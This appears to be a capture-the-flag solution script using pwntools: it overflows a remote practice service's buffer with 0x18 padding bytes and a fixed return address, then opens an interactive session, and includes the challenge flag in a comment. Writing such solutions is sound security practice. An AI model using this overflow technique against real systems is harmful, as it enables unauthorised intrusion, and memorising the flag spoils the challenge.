#!/usr/bin/env python
from pwn import *

# AD{We1c0me_h4cker!_:P}

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10100
y = remote( host , port )

p = flat(
    'D' * 0x18,
    0x40063a
)

y.sendline( p )


y.interactive()